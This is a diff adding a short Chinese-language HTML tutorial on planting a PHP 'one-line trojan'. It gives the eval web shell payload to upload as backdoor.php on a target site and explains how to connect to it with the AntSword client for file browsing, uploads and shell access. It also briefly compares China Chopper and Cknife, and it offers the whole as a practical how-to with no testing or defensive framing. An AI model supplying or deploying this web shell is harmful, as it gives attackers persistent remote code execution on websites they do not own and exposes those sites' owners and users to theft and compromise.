@@ -1,0 +1,26 @@
+<p>一句话木马的作用： 上传到某网站后台(php, asp, jsp ... ) ，然后再攻击者段运行webshell(菜刀)类程序，就可以连接，实现：</p>
+<p>1 文件夹的浏览</p>
+<p>2 上传文件</p>
+<p>3 webshell</p>
+<p>webshell分成：</p>
+<p>中国菜刀（已经挂掉了，找不到地方下载. exe 文件， 只运行在 windows）</p>
+<p>Cknife&#160; java程序，可以跨平台（理论上），实际上无法在 kali上运行。 windows可以运行，界面不太友好</p>
+<p>剑蚁：antsword, 特别好用，参考：<a href="https://github.com/AntSwordProject/AntSword-Loader">https://github.com/AntSwordProject/AntSword-Loader</a>
+</p>
+<p>具体用法：<a href="https://doc.u0u.us/zh-hans/getting_started/first_shell.html">https://doc.u0u.us/zh-hans/getting_started/first_shell.html</a>
+</p>
+<p>下载： 直接github下载即可。</p>
+<p>使用：</p>
+<p>1. 在目标网站上传一个文件，（一句话木马 例如叫 backdoor.php）内容如下：</p>
+<pre>&lt;?php @eval($_POST['secret']) ?&gt;
+</pre>
+<p>2. 上面php文件可以通过某路径访问，例如： http://target.com/backdoor.php</p>
+<p>3. 打开剑蚁。&#160;</p>
+<p>右键，添加数据。</p>
+<p>url： （见上面）</p>
+<p>连接密码 ： secret</p>
+<p>就可以了。</p>
+<p>点击 测试，就可以看到可以连接了。</p>
+<p>保存后，打开，就可以看到对应的各种功能了。&#160; 666&#160;</p>
+<p>太强大了。</p>
+<img src="http://files.sweetysoft.com/image_after_2021_03_26/3572/antsword.png" />
